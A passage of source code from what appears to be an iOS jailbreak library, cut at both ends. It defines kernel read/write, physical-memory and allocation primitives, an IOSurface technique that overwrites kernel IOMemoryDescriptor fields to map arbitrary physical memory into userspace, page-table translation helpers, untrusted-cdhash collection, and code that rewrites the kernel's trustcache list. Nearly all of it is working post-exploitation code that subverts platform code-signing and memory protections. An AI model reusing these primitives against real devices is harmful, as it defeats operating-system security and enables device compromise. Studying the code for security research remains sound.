		return gPrimitives.kalloc_global(addr, size);
	}
	else if (options == KALLOC_OPTION_LOCAL && gPrimitives.kalloc_local) {
		return gPrimitives.kalloc_local(addr, size);
	}
	return -1;
}

int kalloc(uint64_t *addr, uint64_t size)
{
	return kalloc_with_options(addr, size, KALLOC_OPTION_GLOBAL);
}

int kfree(uint64_t addr, uint64_t size)
{
	if (gPrimitives.kfree_global) {
		return gPrimitives.kfree_global(addr, size);
	}
	return -1;
}

bool is_kcall_available(void)
{
#ifdef __arm64e__
	return jbinfo(usesPACBypass);
#else
	if (__builtin_available(iOS 16.0, *)) {
		return false;
	}
	return true;
#endif
}

```

`BaseBin/libjailbreak/src/primitives.h`:

```h
#ifndef PRIMITIVES_H
#define PRIMITIVES_H

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include "primitives_external.h"

#define BIT(b)    (1ULL << (b))
#define ONES(x)          (BIT((x))-1)
#define PAC_MASK kconstant(pointer_mask)
#define SIGN(p)          ((p) & BIT(55))
#define UNSIGN_PTR(p)    (SIGN(p) ? ((p) | PAC_MASK) : ((p) & ~PAC_MASK))

typedef enum
{
	KALLOC_OPTION_GLOBAL, // Global Allocation, never manually freed
	KALLOC_OPTION_LOCAL, // Allocation attached to this process, freed on process exit
} kalloc_options;

void enumerate_pages(uint64_t start, size_t size, uint64_t pageSize, bool (^block)(uint64_t, size_t));

int kreadbuf(uint64_t kaddr, void* output, size_t size);
int kwritebuf(uint64_t kaddr, const void* input, size_t size);
int physreadbuf(uint64_t physaddr, void* output, size_t size);
int physwritebuf(uint64_t physaddr, const void* input, size_t size);
int vreadbuf(uint64_t tte_p, const void *addr, void *outdata, size_t datalen);
int vwritebuf(uint64_t tte_p, const void *addr, const void *indata, size_t datalen);
int proc_vreadbuf(uint64_t proc, const void *addr, void *outdata, size_t datalen);
int proc_vwritebuf(uint64_t proc, const void *addr, const void *indata, size_t datalen);

uint64_t physread64(uint64_t pa);
uint64_t physread_ptr(uint64_t va);
uint32_t physread32(uint64_t pa);
uint16_t physread16(uint64_t pa);
uint8_t physread8(uint64_t pa);

int physwrite64(uint64_t pa, uint64_t v);
int physwrite32(uint64_t pa, uint32_t v);
int physwrite16(uint64_t pa, uint16_t v);
int physwrite8(uint64_t pa, uint8_t v);

uint64_t kread64(uint64_t va);
uint64_t kread_ptr(uint64_t va);
uint64_t kread_smrptr(uint64_t va);
uint32_t kread32(uint64_t va);
uint16_t kread16(uint64_t va);
uint8_t kread8(uint64_t va);

int kwrite64(uint64_t va, uint64_t v);
int kwrite_ptr(uint64_t kaddr, uint64_t pointer, uint16_t salt);
int kwrite32(uint64_t va, uint32_t v);
int kwrite16(uint64_t va, uint16_t v);
int kwrite8(uint64_t va, uint8_t v);

int kcall(uint64_t *result, uint64_t func, int argc, const uint64_t *argv);
int kexec(kRegisterState *state);

int kmap(uint64_t pa, uint64_t size, void **uaddr);
int kalloc_with_options(uint64_t *addr, uint64_t size, kalloc_options options);
int kalloc(uint64_t *addr, uint64_t size);

int kfree(uint64_t addr, uint64_t size);

bool is_kcall_available(void);

#endif

```

`BaseBin/libjailbreak/src/primitives_IOSurface.h`:

```h
#ifndef PRIMITIVES_IOSURFACE_H
#define PRIMITIVES_IOSURFACE_H

void *IOSurface_map(uint64_t phys, uint64_t size);
uint64_t IOSurface_kalloc(uint64_t size, bool leak);
int IOSurface_kalloc_global(uint64_t *addr, uint64_t size);
int IOSurface_kalloc_local(uint64_t *addr, uint64_t size);
void libjailbreak_IOSurface_primitives_init(void);

#endif

```

`BaseBin/libjailbreak/src/primitives_IOSurface.m`:

```m
#import "info.h"
#import "primitives.h"
#import "translation.h"
#import "kernel.h"
#import "util.h"
#import <Foundation/Foundation.h>
#import <IOSurface/IOSurfaceRef.h>
#import <CoreGraphics/CoreGraphics.h>
#import <mach-o/dyld.h>

uint64_t IOSurfaceRootUserClient_get_surfaceClientById(uint64_t rootUserClient, uint32_t surfaceId)
{
	uint64_t surfaceClientsArray = kread_ptr(rootUserClient + 0x118);
	return kread_ptr(surfaceClientsArray + (sizeof(uint64_t)*surfaceId));
}

uint64_t IOSurfaceClient_get_surface(uint64_t surfaceClient)
{
	return kread_ptr(surfaceClient + 0x40);
}

uint64_t IOSurfaceSendRight_get_surface(uint64_t surfaceSendRight)
{
	return kread_ptr(surfaceSendRight + 0x18);	
}

uint64_t IOSurface_get_ranges(uint64_t surface)
{
	return kread_ptr(surface + 0x3e0);
}

void IOSurface_set_ranges(uint64_t surface, uint64_t ranges)
{
	kwrite64(surface + 0x3e0, ranges);
}

uint64_t IOSurface_get_memoryDescriptor(uint64_t surface)
{
	return kread_ptr(surface + 0x38);
}

uint64_t IOMemoryDescriptor_get_ranges(uint64_t memoryDescriptor)
{
	return kread_ptr(memoryDescriptor + 0x60);
}

uint64_t IOMemorydescriptor_get_size(uint64_t memoryDescriptor)
{
	return kread64(memoryDescriptor + 0x50);
}

void IOMemoryDescriptor_set_size(uint64_t memoryDescriptor, uint64_t size)
{
	kwrite64(memoryDescriptor + 0x50, size);
}

void IOMemoryDescriptor_set_wired(uint64_t memoryDescriptor, bool wired)
{
	kwrite8(memoryDescriptor + 0x88, wired);
}

uint32_t IOMemoryDescriptor_get_flags(uint64_t memoryDescriptor)
{
	return kread32(memoryDescriptor + 0x20);
}

void IOMemoryDescriptor_set_flags(uint64_t memoryDescriptor, uint32_t flags)
{
	kwrite8(memoryDescriptor + 0x20, flags);
}

void IOMemoryDescriptor_set_memRef(uint64_t memoryDescriptor, uint64_t memRef)
{
	kwrite64(memoryDescriptor + 0x28, memRef);
}

uint64_t IOSurface_get_rangeCount(uint64_t surface)
{
	return kread_ptr(surface + 0x3e8);
}

void IOSurface_set_rangeCount(uint64_t surface, uint32_t rangeCount)
{
	kwrite32(surface + 0x3e8, rangeCount);
}

static mach_port_t IOSurface_map_getSurfacePort(uint64_t magic)
{
	IOSurfaceRef surfaceRef = IOSurfaceCreate((__bridge CFDictionaryRef)@{
		(__bridge NSString *)kIOSurfaceWidth : @120,
		(__bridge NSString *)kIOSurfaceHeight : @120,
		(__bridge NSString *)kIOSurfaceBytesPerElement : @4,
	});
	mach_port_t port = IOSurfaceCreateMachPort(surfaceRef);
	*((uint64_t *)IOSurfaceGetBaseAddress(surfaceRef)) = magic;
	IOSurfaceDecrementUseCount(surfaceRef);
	CFRelease(surfaceRef);
	return port;
}

int IOSurface_map(uint64_t pa, uint64_t size, void **uaddr)
{
	mach_port_t surfaceMachPort = IOSurface_map_getSurfacePort(1337);

	uint64_t surfaceSendRight = task_get_ipc_port_kobject(task_self(), surfaceMachPort);
	uint64_t surface = IOSurfaceSendRight_get_surface(surfaceSendRight);
	uint64_t desc = IOSurface_get_memoryDescriptor(surface);
	uint64_t ranges = IOMemoryDescriptor_get_ranges(desc);

	kwrite64(ranges, pa);
	kwrite64(ranges+8, size);

	IOMemoryDescriptor_set_size(desc, size);

	kwrite64(desc + 0x70, 0);
	kwrite64(desc + 0x18, 0);
	kwrite64(desc + 0x90, 0);

	IOMemoryDescriptor_set_wired(desc, true);

	uint32_t flags = IOMemoryDescriptor_get_flags(desc);
	IOMemoryDescriptor_set_flags(desc, (flags & ~0x410) | 0x20);

	IOMemoryDescriptor_set_memRef(desc, 0);

	IOSurfaceRef mappedSurfaceRef = IOSurfaceLookupFromMachPort(surfaceMachPort);
	*uaddr = IOSurfaceGetBaseAddress(mappedSurfaceRef);
	return 0;
}

static mach_port_t IOSurface_kalloc_getSurfacePort(uint64_t size)
{
	uint64_t allocSize = 0x10;
	uint64_t *addressRangesBuf = (uint64_t *)malloc(size);
	memset(addressRangesBuf, 0, size);
	addressRangesBuf[0] = (uint64_t)malloc(allocSize);
	addressRangesBuf[1] = allocSize;
	NSData *addressRanges = [NSData dataWithBytes:addressRangesBuf length:size];
	free(addressRangesBuf);

	IOSurfaceRef surfaceRef = IOSurfaceCreate((__bridge CFDictionaryRef)@{
		@"IOSurfaceAllocSize" : @(allocSize),
		@"IOSurfaceAddressRanges" : addressRanges,
	});
	mach_port_t port = IOSurfaceCreateMachPort(surfaceRef);
	IOSurfaceDecrementUseCount(surfaceRef);
	return port;
}

uint64_t IOSurface_kalloc(uint64_t size, bool leak)
{
	while (true) {
		uint64_t allocSize = max(size, 0x10000);
		mach_port_t surfaceMachPort = IOSurface_kalloc_getSurfacePort(allocSize);

		uint64_t surfaceSendRight = task_get_ipc_port_kobject(task_self(), surfaceMachPort);
		uint64_t surface = IOSurfaceSendRight_get_surface(surfaceSendRight);
		uint64_t va = IOSurface_get_ranges(surface);

		if (kvtophys(va + allocSize) != 0) {
			mach_port_deallocate(mach_task_self(), surfaceMachPort);
			continue;
		}

		if (va == 0) continue;

		if (leak) {
			IOSurface_set_ranges(surface, 0);
			IOSurface_set_rangeCount(surface, 0);
		}

		return va + (allocSize - size);
	}

	return 0;
}

int IOSurface_kalloc_global(uint64_t *addr, uint64_t size)
{
	uint64_t alloc = IOSurface_kalloc(size, true);
	if (alloc != 0) {
		*addr = alloc;
		return 0;
	}
	return -1;
}

int IOSurface_kalloc_local(uint64_t *addr, uint64_t size)
{
	uint64_t alloc = IOSurface_kalloc(size, false);
	if (alloc != 0) {
		*addr = alloc;
		return 0;
	}
	return -1;
}

void libjailbreak_IOSurface_primitives_init(void)
{
	IOSurfaceRef surfaceRef = IOSurfaceCreate((__bridge CFDictionaryRef)@{
		(__bridge NSString *)kIOSurfaceWidth : @120,
		(__bridge NSString *)kIOSurfaceHeight : @120,
		(__bridge NSString *)kIOSurfaceBytesPerElement : @4,
	});
	if (!surfaceRef) {
		char execPath[PATH_MAX];
		uint32_t execPathSize = PATH_MAX;
		_NSGetExecutablePath(execPath, &execPathSize);
		printf("Failed to initialize IOSurface primitives, add \"IOSurfaceRootUserClient\" to the \"com.apple.security.exception.iokit-user-client-class\" dictionary of the entitlements from \"%s\" to fix this. Due to this, the kalloc, kmap and kcall primitives will not work.\n", execPath);
		return;
	}
	CFRelease(surfaceRef);

	gPrimitives.kmap = IOSurface_map;
	if (@available(iOS 16.0, *)) {}
	else {
		gPrimitives.kalloc_global = IOSurface_kalloc_global;
		gPrimitives.kalloc_local  = IOSurface_kalloc_local;
	}
}
```

`BaseBin/libjailbreak/src/primitives_external.h`:

```h
#ifndef PRIMITIVES_EXTERNAL_H
#define PRIMITIVES_EXTERNAL_H

typedef struct {
    uint64_t unk;
    uint64_t x[29];
    uint64_t fp;
    uint64_t lr;
    uint64_t sp;
    uint64_t pc;
    uint32_t cpsr;
    // Other stuff
    uint64_t other[70];
} kRegisterState;

struct kernel_primitives {
	int (*kreadbuf)(uint64_t kaddr, void* output, size_t size);
	int (*kwritebuf)(uint64_t kaddr, const void* input, size_t size);
	int (*physreadbuf)(uint64_t physaddr, void* output, size_t size);
	int (*physwritebuf)(uint64_t physaddr, const void* input, size_t size);
	uint64_t (*kcall)(uint64_t func, int argc, const uint64_t *argv);
	void (*kexec)(kRegisterState *state);
	int (*kalloc_global)(uint64_t *addr, uint64_t size);
	int (*kalloc_local)(uint64_t *addr, uint64_t size);
	int (*kfree_global)(uint64_t addr, uint64_t size);
	int (*kmap)(uint64_t pa, uint64_t size, void **uaddr);
	uint64_t (*vtophys)(uint64_t ttep, uint64_t va);
	uint64_t (*phystokv)(uint64_t pa);
};

extern struct kernel_primitives gPrimitives;

#endif

```

`BaseBin/libjailbreak/src/pte.h`:

```h
#ifndef PTE_H
#define PTE_H

#define PTE_NON_GLOBAL      (1 << 11)
#define PTE_VALID           (1 << 10) // Access flag
#define PTE_OUTER_SHAREABLE (2 << 8)
#define PTE_INNER_SHAREABLE (3 << 8)

//#define PTE_LEVEL2_BLOCK    PTE_VALID | (0x1)
#define PTE_LEVEL2_BLOCK    PTE_VALID | (0x0)
#define PTE_LEVEL3_ENTRY    PTE_VALID | 0x3

#define KRW_URW_PERM        (0x60000000000040)
#define KRW_UR_PERM         (0x600000000000C0)

#define PTE_RESERVED        (0x3)
#define PTE_REUSEABLE       (0x1)
#define PTE_UNUSED          (0x0)

#define P_PAGE_SIZE 0x4000
#define P_PAGE_MASK 0x3FFF

#define PTE_TO_PERM(pte)  ((((pte) >> 4ULL) & 0xC) | (((pte) >> 52ULL) & 2) | (((pte) >> 54ULL) & 1))
#define _PERM_TO_PTE(perm) ((((perm) & 0xC) << 4ULL) | (((perm) & 2) << 52ULL) | (((perm) & 1) << 54ULL))
#define PERM_TO_PTE(perm) _PERM_TO_PTE((uint64_t) (perm))

#define AP_RWNA   (0x0ull << 6)
#define AP_RWRW   (0x1ull << 6)
#define AP_RONA   (0x2ull << 6)
#define AP_RORO   (0x3ull << 6)

#define ARM_PTE_TYPE              0x0000000000000003ull
#define ARM_PTE_TYPE_VALID        0x0000000000000003ull
#define ARM_PTE_TYPE_MASK         0x0000000000000002ull
#define ARM_TTE_TYPE_L3BLOCK      0x0000000000000002ull
#define ARM_PTE_ATTRINDX          0x000000000000001cull
#define ARM_PTE_NS                0x0000000000000020ull
#define ARM_PTE_AP                0x00000000000000c0ull
#define ARM_PTE_SH                0x0000000000000300ull
#define ARM_PTE_AF                0x0000000000000400ull
#define ARM_PTE_NG                0x0000000000000800ull
#define ARM_PTE_ZERO1             0x000f000000000000ull
#define ARM_PTE_HINT              0x0010000000000000ull
#define ARM_PTE_PNX               0x0020000000000000ull
#define ARM_PTE_NX                0x0040000000000000ull
#define ARM_PTE_ZERO2             0x0380000000000000ull
#define ARM_PTE_WIRED             0x0400000000000000ull
#define ARM_PTE_WRITEABLE         0x0800000000000000ull
#define ARM_PTE_ZERO3             0x3000000000000000ull
#define ARM_PTE_COMPRESSED_ALT    0x4000000000000000ull
#define ARM_PTE_COMPRESSED        0x8000000000000000ull

#define ARM_TTE_VALID         0x0000000000000001ull
#define ARM_TTE_TYPE_MASK     0x0000000000000002ull
#define ARM_TTE_TYPE_TABLE    0x0000000000000002ull
#define ARM_TTE_TYPE_BLOCK    0x0000000000000000ull
#define ARM_TTE_TABLE_MASK    0x0000fffffffff000ull
#define ARM_TTE_PA_MASK       0x0000fffffffff000ull

#define PMAP_TT_L0_LEVEL    0x0
#define PMAP_TT_L1_LEVEL    0x1
#define PMAP_TT_L2_LEVEL    0x2
#define PMAP_TT_L3_LEVEL    0x3

#define ARM_16K_TT_L0_SIZE          0x0000800000000000ull
#define ARM_16K_TT_L0_OFFMASK       0x00007fffffffffffull
#define ARM_16K_TT_L0_SHIFT         47
#define ARM_16K_TT_L0_INDEX_MASK    0x0000800000000000ull

#define ARM_16K_TT_L1_SIZE          0x0000001000000000ull
#define ARM_16K_TT_L1_OFFMASK       0x0000000fffffffffull
#define ARM_16K_TT_L1_SHIFT         36
#define ARM_16K_TT_L1_INDEX_MASK    0x0000007000000000ull

#define ARM_16K_TT_L2_SIZE          0x0000000002000000ull
#define ARM_16K_TT_L2_OFFMASK       0x0000000001ffffffull
#define ARM_16K_TT_L2_SHIFT         25
#define ARM_16K_TT_L2_INDEX_MASK    0x0000000ffe000000ull

#define ARM_16K_TT_L3_SIZE          0x0000000000004000ull
#define ARM_16K_TT_L3_OFFMASK       0x0000000000003fffull
#define ARM_16K_TT_L3_SHIFT         14
#define ARM_16K_TT_L3_INDEX_MASK    0x0000000001ffc000ull

#define ARM_4K_TT_L0_SIZE           0x0000008000000000ULL
#define ARM_4K_TT_L0_OFFMASK        0x0000007fffffffffULL
#define ARM_4K_TT_L0_SHIFT          39
#define ARM_4K_TT_L0_INDEX_MASK     0x0000ff8000000000ULL

#define ARM_4K_TT_L1_SIZE           0x0000000040000000ULL
#define ARM_4K_TT_L1_OFFMASK        0x000000003fffffffULL
#define ARM_4K_TT_L1_SHIFT          30
#define ARM_4K_TT_L1_INDEX_MASK     0x0000003fc0000000ULL

#define ARM_4K_TT_L2_SIZE           0x0000000000200000ULL
#define ARM_4K_TT_L2_OFFMASK        0x00000000001fffffULL
#define ARM_4K_TT_L2_SHIFT          21
#define ARM_4K_TT_L2_INDEX_MASK     0x000000003fe00000ULL

#define ARM_4K_TT_L3_SIZE           0x0000000000001000ULL
#define ARM_4K_TT_L3_OFFMASK        0x0000000000000fffULL
#define ARM_4K_TT_L3_SHIFT          12
#define ARM_4K_TT_L3_INDEX_MASK     0x00000000001ff000ULL

#endif

```

`BaseBin/libjailbreak/src/pvh.h`:

```h
#ifndef PVH_H
#define PVH_H

#define PVH_TYPE_MASK (0x3UL)
#define PVH_LIST_MASK (~PVH_TYPE_MASK)
#define PVH_FLAG_CPU (1ULL << 62)
#define PVH_LOCK_BIT 61
#define PVH_FLAG_LOCK (1ULL << PVH_LOCK_BIT)
#define PVH_FLAG_EXEC (1ULL << 60)
#define PVH_FLAG_LOCKDOWN_KC (1ULL << 59)
#define PVH_FLAG_HASHED (1ULL << 58)
#define PVH_FLAG_LOCKDOWN_CS (1ULL << 57)
#define PVH_FLAG_LOCKDOWN_RO (1ULL << 56)
#define PVH_FLAG_FLUSH_NEEDED (1ULL << 54)
#define PVH_FLAG_LOCKDOWN_MASK (PVH_FLAG_LOCKDOWN_KC | PVH_FLAG_LOCKDOWN_CS | PVH_FLAG_LOCKDOWN_RO)
#define PVH_HIGH_FLAGS (PVH_FLAG_CPU | PVH_FLAG_LOCK | PVH_FLAG_EXEC | PVH_FLAG_LOCKDOWN_MASK | \
    PVH_FLAG_HASHED | PVH_FLAG_FLUSH_NEEDED)

#define PVH_TYPE_NULL 0x0UL
#define PVH_TYPE_PVEP 0x1UL
#define PVH_TYPE_PTEP 0x2UL
#define PVH_TYPE_PTDP 0x3UL

#endif
```

`BaseBin/libjailbreak/src/signatures.c`:

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <stdint.h>
#include <stdbool.h>
#include <choma/MachO.h>
#include <choma/Fat.h>
#include <choma/MemoryStream.h>
#include <choma/FileStream.h>
#include <choma/CSBlob.h>
#include <choma/CodeDirectory.h>
#include <choma/Util.h>
#include <choma/Host.h>
#include <mach-o/dyld.h>
#include "trustcache.h"

bool macho_is_mappable(MachO *macho)
{
	// Determine if there is any case in which the macho could be mapped

	struct mach_header *header = macho_get_mach_header(macho);

	cpu_type_t cputype = header->cputype;
	cpu_subtype_t cpusubtype = header->cpusubtype;
	bool isLibrary = (header->filetype == MH_EXECUTE);

	if (cputype != CPU_TYPE_ARM64) return false;

#ifdef __arm64e__

	if (cpusubtype == (CPU_SUBTYPE_ARM64E | CPU_SUBTYPE_ARM64E_ABI_V2)) {
		// New arm64e ABI always mappable on arm64e
		return true;
	}
	else if (cpusubtype == CPU_SUBTYPE_ARM64E && isLibrary) {
		// Old arm64e ABI only mappable for libraries on arm64e iOS 14.6+
		return true;
	}

#endif

	// Anything arm64 is always mappable on all dvices
	if ((cpusubtype == CPU_SUBTYPE_ARM64_V8) || (cpusubtype == CPU_SUBTYPE_ARM64_ALL)) return true;

	return false;
}

bool csd_superblob_is_adhoc_signed(CS_DecodedSuperBlob *superblob)
{
	CS_DecodedBlob *wrapperBlob = csd_superblob_find_blob(superblob, CSSLOT_SIGNATURESLOT, NULL);
	if (wrapperBlob) {
		if (csd_blob_get_size(wrapperBlob) > 8) {
			return false;
		}
	}
	return true;
}

bool code_signature_calculate_adhoc_cdhash(CS_SuperBlob *superblob, cdhash_t cdhashOut)
{
	bool isAdhocSigned = false;

	CS_DecodedSuperBlob *decodedSuperblob = csd_superblob_decode(superblob);
	if (decodedSuperblob) {
		if (csd_superblob_is_adhoc_signed(decodedSuperblob)) {
			if (csd_superblob_calculate_best_cdhash(decodedSuperblob, cdhashOut, NULL) == 0) {
				isAdhocSigned = true;
			}
		}
		csd_superblob_free(decodedSuperblob);
	}

	return isAdhocSigned;
}

bool macho_parse_code_signature(MachO *macho, cdhash_t cdhashOut)
{
	bool isAdhocSigned = false;

	CS_SuperBlob *superblob = macho_read_code_signature(macho);
	if (superblob) {
		isAdhocSigned = code_signature_calculate_adhoc_cdhash(superblob, cdhashOut);
		free(superblob);
	}

	return isAdhocSigned;
}

void file_collect_untrusted_cdhashes(int fd, cdhash_t **cdhashesOut, uint32_t *cdhashCountOut)
{
	MemoryStream *s = file_stream_init_from_file_descriptor(fd, 0, FILE_STREAM_SIZE_AUTO, 0);
	if (!s) return;

	Fat *fat = fat_init_from_memory_stream(s);
	if (!fat) {
		memory_stream_free(s);
		return;
	}

	__block cdhash_t *cdhashes = NULL;
	__block uint32_t cdhashCount = 0;
	fat_enumerate_slices(fat, ^(MachO *macho, bool *stop) {
		if (macho_is_mappable(macho)) {
			cdhash_t cdhash;
			if (macho_parse_code_signature(macho, cdhash)) {
				if (!is_cdhash_trustcached(cdhash)) {
					cdhashCount++;
					cdhashes = realloc(cdhashes, cdhashCount * sizeof(cdhash_t));
					memcpy(cdhashes[cdhashCount-1], cdhash, sizeof(cdhash));
				}
			}
		}
	});

	fat_free(fat);

	*cdhashesOut = cdhashes;
	*cdhashCountOut = cdhashCount;
}

void file_collect_untrusted_cdhashes_by_path(const char *path, cdhash_t **cdhashesOut, uint32_t *cdhashCountOut)
{
	int fd = open(path, O_RDONLY);
	if (fd < 0) return;
	file_collect_untrusted_cdhashes(fd, cdhashesOut, cdhashCountOut);
	close(fd);
}
```

`BaseBin/libjailbreak/src/signatures.h`:

```h
#ifndef SIGNATURES_H
#define SIGNATURES_H

#include <choma/CodeDirectory.h>

typedef enum {
	SIGNATURE_SOURCE_FILE,
	SIGNATURE_SOURCE_PROC,
} signature_source_t;

struct siginfo {
	signature_source_t source;
	fsignatures_t signature;
};

typedef uint8_t cdhash_t[CS_CDHASH_LEN];

bool code_signature_calculate_adhoc_cdhash(CS_SuperBlob *superblob, cdhash_t cdhashOut);
void file_collect_untrusted_cdhashes(int fd, cdhash_t **cdhashesOut, uint32_t *cdhashCountOut);
void file_collect_untrusted_cdhashes_by_path(const char *path, cdhash_t **cdhashesOut, uint32_t *cdhashCountOut);
#endif
```

`BaseBin/libjailbreak/src/translation.c`:

```c
#include "translation.h"
#include "primitives.h"
#include "kernel.h"
#include "info.h"
#include <errno.h>
#include <stdio.h>

struct tt_level {
	uint64_t offMask;
	uint64_t shift;
	uint64_t indexMask;
	uint64_t validMask;
	uint64_t typeMask;
	uint64_t typeBlock;
};
struct tt_level arm_tt_level[4];

// Address translation physical <-> virtual

#define PTOV_TABLE_SIZE 8
uint64_t phystokv(uint64_t pa)
{
	struct ptov_table_entry {
		uint64_t pa;
		uint64_t va;
		uint64_t len;
	} ptov_table[PTOV_TABLE_SIZE];
	kreadbuf(ksymbol(ptov_table), &ptov_table[0], sizeof(ptov_table));

	for (uint64_t i = 0; (i < PTOV_TABLE_SIZE) && (ptov_table[i].len != 0); i++) {
		if ((pa >= ptov_table[i].pa) && (pa < (ptov_table[i].pa + ptov_table[i].len))) {
			return pa - ptov_table[i].pa + ptov_table[i].va;
		}
	}

	return pa - kconstant(physBase) + kconstant(virtBase);
}

uint64_t vtophys_lvl(uint64_t tte_ttep, uint64_t va, uint64_t *leaf_level, uint64_t *leaf_tte_ttep)
{
	errno = 0;
	const uint64_t ROOT_LEVEL = PMAP_TT_L1_LEVEL;
	const uint64_t LEAF_LEVEL = *leaf_level;

	uint64_t pa = 0;

	bool physical = !(bool)(tte_ttep & 0xf000000000000000);

	for (uint64_t curLevel = ROOT_LEVEL; curLevel <= LEAF_LEVEL; curLevel++) {
		if (curLevel > PMAP_TT_L3_LEVEL) {
			errno = 1041;
			return 0;
		}

		struct tt_level *lvlp = &arm_tt_level[curLevel];
		uint64_t tteIndex = (va & lvlp->indexMask) >> lvlp->shift;
		uint64_t tteEntry = 0;
		if (physical) {
			uint64_t tte_pa = tte_ttep + (tteIndex * sizeof(uint64_t));
			tteEntry = physread64(tte_pa);
			if (leaf_tte_ttep) *leaf_tte_ttep = tte_pa;
			if (leaf_level) *leaf_level = curLevel;
		}
		else if (gPrimitives.kreadbuf && !physical) {
			uint64_t tte_va = tte_ttep + (tteIndex * sizeof(uint64_t));
			tteEntry = kread64(tte_va);
			if (leaf_tte_ttep) *leaf_tte_ttep = tte_va;
			if (leaf_level) *leaf_level = curLevel;
		}
		else {
			printf("WARNING: Failed %s translation, no function to do it.\n", physical ? "physical" : "virtual");
			errno = 1043;
			return 0;
		}

		if ((tteEntry & lvlp->validMask) != lvlp->validMask) {
			errno = 1042;
			return 0;
		}

		if ((tteEntry & lvlp->typeMask) == lvlp->typeBlock) {
			// Found block mapping, no matter what level we are in, this is the end
			return ((tteEntry & ARM_TTE_PA_MASK & ~lvlp->offMask) | (va & lvlp->offMask));
		}

		if (physical) {
			tte_ttep = tteEntry & ARM_TTE_TABLE_MASK;
		}
		else {
			tte_ttep = phystokv(tteEntry & ARM_TTE_TABLE_MASK);
		}
	}

	// If we end up here, it means we did not find a block mapping
	// In this case, return the last page table address we traversed
	return tte_ttep;
}

uint64_t vtophys(uint64_t tte_ttep, uint64_t va)
{
	uint64_t level = PMAP_TT_L3_LEVEL;
	return vtophys_lvl(tte_ttep, va, &level, NULL);
}

uint64_t kvtophys(uint64_t va)
{
	return vtophys(kconstant(cpuTTEP), va);
}

void libjailbreak_translation_init(void)
{
	// A9+: Kernel uses 16K pages
	if (vm_real_kernel_page_size == 0x4000) {
		arm_tt_level[0] = (struct tt_level){
			.offMask = ARM_16K_TT_L0_OFFMASK,
			.shift = ARM_16K_TT_L0_SHIFT,
			.indexMask = ARM_16K_TT_L0_INDEX_MASK,
			.validMask = ARM_TTE_VALID,
			.typeMask = ARM_TTE_TYPE_MASK,
			.typeBlock = ARM_TTE_TYPE_BLOCK,
		};
		arm_tt_level[1] = (struct tt_level){
			.offMask = ARM_16K_TT_L1_OFFMASK,
			.shift = ARM_16K_TT_L1_SHIFT,
			.indexMask = kconstant(ARM_TT_L1_INDEX_MASK),
			.validMask = ARM_TTE_VALID,
			.typeMask = ARM_TTE_TYPE_MASK,
			.typeBlock = ARM_TTE_TYPE_BLOCK,
		};
		arm_tt_level[2] = (struct tt_level){
			.offMask = ARM_16K_TT_L2_OFFMASK,
			.shift = ARM_16K_TT_L2_SHIFT,
			.indexMask = ARM_16K_TT_L2_INDEX_MASK,
			.validMask = ARM_TTE_VALID,
			.typeMask = ARM_TTE_TYPE_MASK,
			.typeBlock = ARM_TTE_TYPE_BLOCK,
		};
		arm_tt_level[3] = (struct tt_level){
			.offMask = ARM_16K_TT_L3_OFFMASK,
			.shift = ARM_16K_TT_L3_SHIFT,
			.indexMask = ARM_16K_TT_L3_INDEX_MASK,
			.validMask = ARM_TTE_VALID,
			.typeMask = ARM_TTE_TYPE_MASK,
			.typeBlock = ARM_TTE_TYPE_L3BLOCK,
		};
	}
	// A8: Kernel uses 4k pages
	else if (vm_real_kernel_page_size == 0x1000) {
		arm_tt_level[0] = (struct tt_level){
			.offMask = ARM_4K_TT_L0_OFFMASK,
			.shift = ARM_4K_TT_L0_SHIFT,
			.indexMask = ARM_4K_TT_L0_INDEX_MASK,
			.validMask = ARM_TTE_VALID,
			.typeMask = ARM_TTE_TYPE_MASK,
			.typeBlock = ARM_TTE_TYPE_BLOCK,
		};
		arm_tt_level[1] = (struct tt_level){
			.offMask = ARM_4K_TT_L1_OFFMASK,
			.shift = ARM_4K_TT_L1_SHIFT,
			.indexMask = kconstant(ARM_TT_L1_INDEX_MASK),
			.validMask = ARM_TTE_VALID,
			.typeMask = ARM_TTE_TYPE_MASK,
			.typeBlock = ARM_TTE_TYPE_BLOCK,
		};
		arm_tt_level[2] = (struct tt_level){
			.offMask = ARM_4K_TT_L2_OFFMASK,
			.shift = ARM_4K_TT_L2_SHIFT,
			.indexMask = ARM_4K_TT_L2_INDEX_MASK,
			.validMask = ARM_TTE_VALID,
			.typeMask = ARM_TTE_TYPE_MASK,
			.typeBlock = ARM_TTE_TYPE_BLOCK,
		};
		arm_tt_level[3] = (struct tt_level){
			.offMask = ARM_4K_TT_L3_OFFMASK,
			.shift = ARM_4K_TT_L3_SHIFT,
			.indexMask = ARM_4K_TT_L3_INDEX_MASK,
			.validMask = ARM_TTE_VALID,
			.typeMask = ARM_TTE_TYPE_MASK,
			.typeBlock = ARM_TTE_TYPE_L3BLOCK,
		};
	}

	gPrimitives.phystokv = phystokv;
	gPrimitives.vtophys  = vtophys;
}
```

`BaseBin/libjailbreak/src/translation.h`:

```h
#ifndef TRANSLATION_H
#define TRANSLATION_H

#include <stdint.h>
#include "pte.h"

uint64_t phystokv(uint64_t pa);
uint64_t vtophys_lvl(uint64_t tte_ttep, uint64_t va, uint64_t *leaf_level, uint64_t *leaf_tte_ttep);
uint64_t vtophys(uint64_t tte_ttep, uint64_t va);
uint64_t kvtophys(uint64_t va);
void libjailbreak_translation_init(void);

#endif
```

`BaseBin/libjailbreak/src/trustcache.c`:

```c
#include "trustcache.h"

#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include "kernel.h"
#include "info.h"
#include "primitives.h"

void _trustcache_file_init(trustcache_file_v1 *file)
{
	memset(file, 0, sizeof(*file));
	file->version = 1;
	uuid_generate(file->uuid);
}

// iOS 16:
// ppl_trust_cache_rt has trustcache runtime
// **(ppl_trust_cache_rt+0x20) seems to have the loaded trustcache linked list
// trustcache struct changed, "next" is still at +0x0, but "this" is at +0x20

uint64_t _trustcache_list_get_start(void)
{
	if (ksymbol(pmap_image4_trust_caches)) { // iOS <=15
		return kread64(ksymbol(pmap_image4_trust_caches));
	}
	else if (ksymbol(ppl_trust_cache_rt)) {  // iOS >=16
		return kread64(kread64(ksymbol(ppl_trust_cache_rt) + 0x20));
	}

	return 0;
}

void _trustcache_list_set_start(uint64_t newStart)
{
	if (ksymbol(pmap_image4_trust_caches)) { // iOS <=15
		kwrite64(ksymbol(pmap_image4_trust_caches), newStart);
	}
	else if (ksymbol(ppl_trust_cache_rt)) {  // iOS >=16
